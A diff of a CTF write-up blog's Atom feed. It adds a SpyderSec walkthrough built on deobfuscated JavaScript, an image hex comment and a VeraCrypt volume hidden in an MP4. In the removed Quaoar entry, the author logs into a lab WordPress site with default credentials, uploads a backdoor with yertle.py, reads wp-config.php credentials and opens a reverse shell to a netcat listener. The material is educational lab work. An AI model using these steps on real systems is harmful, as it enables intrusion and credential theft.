@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-10-27T13:22:48-04:00</updated>
+  <updated>2018-11-10T10:34:14-05:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,115 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Take the SpyderSec Challenge]]></title>
+    <link href="http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge/"/>
+    <updated>2018-11-10T07:43:09-05:00</updated>
+    <id>http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge</id>
+    <content type="html"><![CDATA[<p>The challenge:</p>
+
+<blockquote><p>You are looking for two flags. Using discovered pointers in various elements of the running web
+application you can deduce the first flag (a downloadable file) which is required to find the second
+flag (a text file). Look, read and maybe even listen. You will need to use basic web application
+recon skills as well as some forensics to find both flags.</p></blockquote>
+
+<!-- more -->
+
+
+<p><code>
+PORT   STATE  SERVICE VERSION
+22/tcp closed ssh
+80/tcp open   http    Apache httpd
+|_http-server-header: Apache
+|_http-title: SpyderSec | Challenge
+</code></p>
+
+<p>There is just one page for the web server:</p>
+
+<p><img class="center" src="/images/pentest/spydersec/spydersec.png" title="&lsquo;spydersec&rsquo; &lsquo;spydersec&rsquo;" ></p>
+
+<p>There is some peculiar Javascript in the source:</p>
+
+<p>```</p>
+
+<script>
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7:0:1:2:8:6:3:5:4:0:a:1:2:d:c:b:f:3:9:e',16,16,'6c|65|72|27|75|6d|28|61|74|29|64|62|66|2e|3b|69'.split('|'),0,{}))
+</script>
+
+
+<p>```</p>
+
+<p>I used an <a href="https://beautifier.io/">online JS beautifier</a> to deobfuscate this to a hex string, which I then decoded to <code>alert(&lsquo;mulder.fbi&rsquo;);</code>. This name is familiar to me from the X-Files. Anyway, not sure about its relevance for now. Moving on with the information gathering, since nothing came out of Nikto or Gobuster, I browsed the page in Burp, and noticed a strange cookie being set:</p>
+
+<p><code>
+Cookie: URI=%2Fv%2F81JHPbvyEQ8729161jd6aKQ0N4%2F
+</code></p>
+
+<p>URL decoding this gave me the value <code>/v/81JHPbvyEQ8729161jd6aKQ0N4/</code> Tried browsing to this and got a 403 Forbidden error. There is some piece of the puzzle missing..so I took the next step and downloaded all the images and ran them through exiftool..and finally got some luck with the Challenge.png image, which had a hex comment:</p>
+
+<p><code>
+Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
+</code></p>
+
+<p>Had to hex-decode this 2 times to get a base64 string: <em>QSFWdX5qdEgjNzI5c0xBO2g0JQ==</em>, which I decoded to <code>A!Vu~jtH#729sLA;h4%</code>. This looks like a password, but where to use it?</p>
+
+<p>With the hints from the description, knowing that a file will need to be downloaded, I treated mulder.fbi as a file and tried appending it to the URL path that gave me a forbidden error: <a href="http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi">http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi</a></p>
+
+<p>That actually worked and I downloaded the file, which is apparently an MP4:</p>
+
+<p><code>
+file mulder.fbi
+mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
+</code></p>
+
+<p>This is a song by The Platters. Since I couldn&rsquo;t use steghide on a video, I googled for MP4 steganography and found this Lifehacker article about <a href="https://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file">embedding a TrueCrypt volume in a video</a>. I installed Veracrypt and used it to mount the file as a volume, in TrueCrypt mode. At the password prompt, I used the string that I&rsquo;ve decoded earlier, and it served me the volume, with a file called Flag.txt inside!</p>
+
+<p>```
+cat Flag.txt
+Congratulations!</p>
+
+<p>You are a winner.</p>
+
+<p>Please leave some feedback on your thoughts regarding this challenge� Was it fun? Was it hard enough or too easy? What did you like or dislike, what could be done better?</p>
+
+<p><a href="https://www.spydersec.com/feedback">https://www.spydersec.com/feedback</a>
+```</p>
+
+<p>The main takeaways from this challenge for me were the steganography possibilities for video files. Until next time!</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ Q: How many hardware engineers does it \
+| take to change a light bulb? A: None.  |
+| We&rsquo;ll fix it in software.              |
+|                                        |
+| Q: How many system programmers does it |
+| take to change a light bulb? A: None.  |
+| The application can work around it.    |
+|                                        |
+| Q: How many software engineers does it |
+| take to change a light bulb? A: None.  |
+| We&rsquo;ll document it in the manual.       |
+|                                        |
+| Q: How many tech writers does it take  |
+| to change a light bulb? A: None. The   |
+\ user can figure it out.                /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[All your 64Base are belong to us]]></title>
@@ -357,7 +466,7 @@ fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
 <p>When trying to SSH with the key, I got prompted for a passphrase. I took a swing at it with the message from the image, <em>usetheforce</em>, and it was a win:</p>
 
 <p>```
-ssh <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#114;&#x6f;&#x6f;&#x74;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x31;&#x34;&#x35;&#46;&#49;&#x33;&#56;">&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x34;&#53;&#46;&#49;&#x33;&#x38;</a> -p 62964 -i ssh.key
+ssh <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#114;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#x34;&#x35;&#46;&#x31;&#x33;&#56;">&#x72;&#111;&#111;&#x74;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#52;&#x35;&#x2e;&#x31;&#x33;&#56;</a> -p 62964 -i ssh.key
 Enter passphrase for key &lsquo;ssh.key&rsquo;:</p>
 
 <p>Last login: Tue Dec  6 05:40:07 2016 from 172.16.0.18</p>
@@ -747,7 +856,7 @@ nmap -T4 -sC -sV -p- 192.168.145.136</p>
 <p>I already ran Nmap and saw that SSH is listening on port 22222. Trying to SSH as frank gives the next flag:</p>
 
 <p>```
-ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x66;&#x72;&#97;&#x6e;&#x6b;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x31;&#52;&#53;&#46;&#49;&#51;&#54;">&#102;&#x72;&#97;&#x6e;&#x6b;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#52;&#53;&#46;&#x31;&#51;&#x36;</a> -p 22222
+ssh <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#102;&#x72;&#x61;&#110;&#107;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#52;&#x35;&#x2e;&#49;&#51;&#54;">&#102;&#114;&#97;&#110;&#x6b;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#52;&#x35;&#x2e;&#49;&#x33;&#54;</a> -p 22222
 The authenticity of host &lsquo;[192.168.145.136]:22222 ([192.168.145.136]:22222)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is SHA256:DeCMZ74o5wesBHFLyaVY7UTCA7mW+bx6WroHm6AgMqU.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -767,7 +876,7 @@ Warning: Permanently added &lsquo;[192.168.145.136]:22222&rsquo; (ECDSA) to the 
 
 <h6>#</h6>
 
-<p><a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#102;&#x72;&#x61;&#110;&#107;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#49;&#52;&#x35;&#46;&#x31;&#x33;&#54;">&#102;&#x72;&#x61;&#110;&#x6b;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#x31;&#x34;&#x35;&#46;&#49;&#x33;&#x36;</a>&rsquo;s password:
+<p><a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#x66;&#x72;&#x61;&#x6e;&#x6b;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#49;&#52;&#x35;&#46;&#49;&#51;&#x36;">&#102;&#x72;&#x61;&#110;&#107;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x31;&#52;&#53;&#46;&#x31;&#x33;&#54;</a>&rsquo;s password:
 ```</p>
 
 <p>The decoded hint is <code>encrypt</code></p>
@@ -869,7 +978,7 @@ scp -P 22222 barryallen@192.168.145.136:security-system.data .</p>
 
 <h6>#</h6>
 
-<p><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#98;&#x61;&#x72;&#x72;&#x79;&#97;&#x6c;&#108;&#x65;&#110;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x31;&#52;&#53;&#46;&#49;&#x33;&#x36;">&#x62;&#97;&#x72;&#x72;&#x79;&#x61;&#108;&#108;&#101;&#x6e;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x31;&#x34;&#x35;&#x2e;&#x31;&#51;&#x36;</a>&rsquo;s password:
+<p><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x62;&#97;&#114;&#114;&#121;&#x61;&#108;&#108;&#101;&#x6e;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#49;&#52;&#x35;&#46;&#x31;&#51;&#x36;">&#98;&#x61;&#x72;&#114;&#121;&#97;&#108;&#108;&#101;&#110;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#52;&#x35;&#x2e;&#49;&#51;&#x36;</a>&rsquo;s password:
 security-system.data                          100%   71MB   6.6MB/s   00:10  <br/>
 ```</p>
 
@@ -1809,9 +1918,9 @@ PORT   STATE SERVICE VERSION
 <p>The contact page gives us some names and mail addresses:</p>
 
 <ul>
-<li>Roger S. Michaels &ndash; <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x72;&#x6d;&#x69;&#x63;&#104;&#97;&#x65;&#x6c;&#115;&#x40;&#x69;&#109;&#102;&#46;&#108;&#111;&#x63;&#x61;&#x6c;">&#x72;&#109;&#105;&#x63;&#x68;&#97;&#101;&#x6c;&#115;&#x40;&#x69;&#109;&#102;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a></li>
-<li>Alexander B. Keith &ndash; <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#97;&#107;&#x65;&#x69;&#x74;&#104;&#x40;&#105;&#109;&#102;&#46;&#108;&#x6f;&#99;&#x61;&#x6c;">&#97;&#107;&#101;&#105;&#x74;&#x68;&#x40;&#105;&#x6d;&#x66;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a></li>
-<li>Elizabeth R. Stone &ndash; <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x65;&#115;&#x74;&#111;&#x6e;&#101;&#x40;&#105;&#109;&#x66;&#46;&#108;&#x6f;&#x63;&#97;&#x6c;">&#x65;&#x73;&#116;&#111;&#x6e;&#x65;&#64;&#105;&#109;&#x66;&#x2e;&#x6c;&#111;&#99;&#97;&#108;</a></li>
+<li>Roger S. Michaels &ndash; <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#114;&#109;&#105;&#x63;&#x68;&#97;&#x65;&#x6c;&#x73;&#64;&#105;&#109;&#x66;&#x2e;&#x6c;&#x6f;&#99;&#97;&#108;">&#x72;&#x6d;&#105;&#x63;&#104;&#97;&#x65;&#x6c;&#x73;&#x40;&#x69;&#109;&#x66;&#46;&#108;&#111;&#x63;&#x61;&#108;</a></li>
+<li>Alexander B. Keith &ndash; <a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#97;&#x6b;&#x65;&#105;&#x74;&#x68;&#x40;&#x69;&#109;&#102;&#x2e;&#108;&#x6f;&#x63;&#x61;&#108;">&#x61;&#107;&#101;&#x69;&#x74;&#x68;&#64;&#x69;&#109;&#x66;&#x2e;&#108;&#111;&#x63;&#97;&#108;</a></li>
+<li>Elizabeth R. Stone &ndash; <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x65;&#115;&#116;&#x6f;&#x6e;&#x65;&#64;&#105;&#109;&#102;&#46;&#x6c;&#x6f;&#99;&#97;&#108;">&#101;&#x73;&#116;&#111;&#x6e;&#x65;&#64;&#x69;&#x6d;&#102;&#46;&#108;&#111;&#x63;&#97;&#x6c;</a></li>
 </ul>
 
 
@@ -2577,7 +2686,7 @@ Thank you for trying this challenge and please send any feedback.</p>
 
 <p>Geckom
 Twitter: @g3ck0ma
-Email: <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#103;&#x65;&#x63;&#x6b;&#111;&#109;&#x40;&#x72;&#x65;&#100;&#x74;&#101;&#x61;&#109;&#114;&#46;&#x63;&#x6f;&#x6d;">&#103;&#x65;&#x63;&#x6b;&#x6f;&#109;&#x40;&#x72;&#101;&#x64;&#x74;&#101;&#x61;&#109;&#x72;&#46;&#99;&#111;&#x6d;</a>
+Email: <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x67;&#x65;&#x63;&#x6b;&#111;&#x6d;&#x40;&#x72;&#x65;&#100;&#x74;&#101;&#x61;&#109;&#114;&#46;&#x63;&#111;&#x6d;">&#x67;&#x65;&#99;&#x6b;&#111;&#x6d;&#64;&#x72;&#101;&#x64;&#x74;&#x65;&#x61;&#109;&#x72;&#46;&#x63;&#111;&#x6d;</a>
 Web: <a href="http://redteamr.com">http://redteamr.com</a></p>
 
 <p>Special Thanks
@@ -2605,199 +2714,6 @@ Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)
 | and the wisdom never to use either.    |
 |                                        |
 \ &mdash; Mark Twain                          /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Hackfest 2016: Quaoar]]></title>
-    <link href="http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar/"/>
-    <updated>2018-09-21T10:37:53-04:00</updated>
-    <id>http://chousensha.github.io/blog/2018/09/21/hackfest-2016-quaoar</id>
-    <content type="html"><![CDATA[<p>Today&rsquo;s target was created for the Hackfest 2016 CTF. The goal is to become root and get a flag on the machine.</p>
-
-<!-- more -->
-
-
-<p>Nmap shows SSH, Samba, a web server and mail services running on the target:</p>
-
-<p><code>
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
-|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
-|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
-53/tcp  open  domain      ISC BIND 9.8.1-P1
-| dns-nsid:
-|_  bind.version: 9.8.1-P1
-80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
-| http-robots.txt: 1 disallowed entry
-|_Hackers
-|_http-server-header: Apache/2.2.22 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html).
-110/tcp open  pop3        Dovecot pop3d
-|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP
-| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
-| Not valid before: 2016-10-07T04:32:43
-|_Not valid after:  2026-10-07T04:32:43
-|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-143/tcp open  imap        Dovecot imapd
-|_imap-capabilities: post-login have more capabilities Pre-login LOGINDISABLEDA0001 LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID STARTTLS IMAP4rev1 IDLE SASL-IR
-| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
-| Not valid before: 2016-10-07T04:32:43
-|_Not valid after:  2026-10-07T04:32:43
-|_ssl-date: 2018-09-21T14:42:41+00:00; 0s from scanner time.
-445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
-993/tcp open  ssl/imap    Dovecot imapd
-|_imap-capabilities: post-login more capabilities Pre-login have LITERAL+ listed ENABLE OK LOGIN-REFERRALS ID AUTH=PLAINA0001 IMAP4rev1 IDLE SASL-IR
-| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
-| Not valid before: 2016-10-07T04:32:43
-|_Not valid after:  2026-10-07T04:32:43
-|_ssl-date: 2018-09-21T14:42:41+00:00; +1s from scanner time.
-995/tcp open  ssl/pop3    Dovecot pop3d
-| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
-| Not valid before: 2016-10-07T04:32:43
-|_Not valid after:  2026-10-07T04:32:43
-|_ssl-date: 2018-09-21T14:42:40+00:00; +1s from scanner time.
-</code></p>
-
-<p>On the web server there are some pictures with planets and the message &ldquo;Hack The Planet&rdquo;. But there are entries in robots.txt:</p>
-
-<p>```
-Disallow: Hackers
-Allow: /wordpress/</p>
-
-<hr />
-
-<h1>/<em><strong> _   _  </strong> _  </em><strong>   </strong> _ _ __</h1>
-
-<h1>//  / / | | |/ _<code>|/ _ \ / _</code> | &lsquo;__|</h1>
-
-<h1>/ _/ /| |<em>| | (</em>| | (<em>) | (</em>| | |</h1>
-
-<h1>_<strong>,<em>\ _</em>,<em>|_</em>,_|_</strong>/ _<em>,</em>|_|</h1>
-
-<p>```</p>
-
-<p>No directory called hackers but there is a Wordpress blog :p</p>
-
-<p><img class="center" src="/images/pentest/quaoar/quaoar_blog.png" title="&lsquo;wordpress&rsquo; &lsquo;wordpress blog&rsquo;" ></p>
-
-<p>Naturally, I ran Wpscan, and it found 2 usernames:</p>
-
-<p>```
-[+] Enumerating usernames &hellip;
-[+] We identified the following 2 users:</p>
-
-<pre><code>+----+--------+--------+
-| ID | Login  | Name   |
-+----+--------+--------+
-| 1  | admin  | admin  |
-| 2  | wpuser | wpuser |
-+----+--------+--------+
-</code></pre>
-
-<p>```</p>
-
-<p>A prelimiary check for default credentials actually revealed the password for the admin user is..you will never guess it..admin! For receiving a shell, I wanted to try a new tool: <a href="https://github.com/n00py/WPForce">WPForce</a>!</p>
-
-<blockquote><p>WPForce is a suite of Wordpress Attack tools. Currently this contains 2 scripts &ndash; WPForce, which
-brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been
-found. Yertle also contains a number of post exploitation modules.</p></blockquote>
-
-<p>I used the <code>yertle.py</code> script to upload a backdoor:</p>
-
-<p>```
-python yertle.py -u &ldquo;admin&rdquo; -p &ldquo;admin&rdquo; -t &ldquo;<a href="http://192.168.217.145/wordpress">http://192.168.217.145/wordpress</a>&rdquo; -i</p>
-
-<pre><code> _..---.--.    __   __        _   _
-</code></pre>
-
-<p>   .&lsquo;\ <strong>|/O.</strong>)   \ \ / /<strong> _ </strong>| |<em>| | </em><strong>
-  /</strong>.&rsquo; <em>/ .&ndash;&lsquo;</em>\    \ V / _ \ &rsquo;<strong>| </strong>| |/ _ .
- (<strong><em><em>.&lsquo;.&ndash;</em>_</em></strong>)    | |  <strong>/ |  | |_| |  </strong>/
-  (<em>/ </em>)<strong>(<em> _)_   |</em>|_</strong>|<em>|   _</em>|<em>|___|
-   (</em>..)&mdash;(.._)&rsquo;&mdash;&lsquo;         ~n00py~</p>
-
-<pre><code>  Post-exploitation Module for Wordpress
-                 v.1.1.0
-</code></pre>
-
-<p>Backdoor uploaded!
-Upload Directory: cpucqjc
-os-shell> whoami
-Sent command: whoami
-www-data
-os-shell> pwd
-Sent command: pwd
-/var/www/wordpress/wp-content/plugins/cpucqjc
-```</p>
-
-<p>Time to snoop around! I was able to read <code>/var/www/wordpress/wp-config.php</code> and inside found credentials for the SQL database:</p>
-
-<p>```
-/<em>* MySQL database username </em>/
-define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);</p>
-
-<p>/<em>* MySQL database password </em>/
-define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;rootpassword!&rsquo;);
-```</p>
-
-<p>I also found a flag inside <em>wpadmin</em>&rsquo;s home directory:</p>
-
-<p><code>
-os-shell&gt; cat /home/wpadmin/flag.txt
-Sent command: cat /home/wpadmin/flag.txt
-2bafe61f03117ac66a73c3c514de796e
-</code></p>
-
-<p>I found the shell I had pretty restrictive so I used Yertle to get a reverse shell that I could upgrade:</p>
-
-<p><code>
-os-shell&gt; shell
-IP Address: 192.168.217.132
-Port: 8888
-Sending reverse shell to 192.168.217.132 port 8888
-</code></p>
-
-<p>And on my listener side:</p>
-
-<p><code>
-nc -lnvp 8888
-listening on [any] 8888 ...
-connect to [192.168.217.132] from (UNKNOWN) [192.168.217.145] 50713
-bash: no job control in this shell
-www-data@Quaoar:/var/www/wordpress/wp-content/plugins/cpucqjc$
-</code></p>
-
-<p>I used Python to spawn a TTY and then I tried the root credentials for a pleasant surprise. They are the actual credentials of the root user!</p>
-
-<p><code>
-root@Quaoar:~# cat /root/flag.txt
-8e3f9ec016e3598c5eec11fd3d73f6fb
-</code></p>
-
-<p>And that was it for this challenge!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ Be cheerful while you are alive. \
-|                                  |
-\ &mdash; Phathotep, 24th Century B.C.  /</p>
 
 <hr />
 
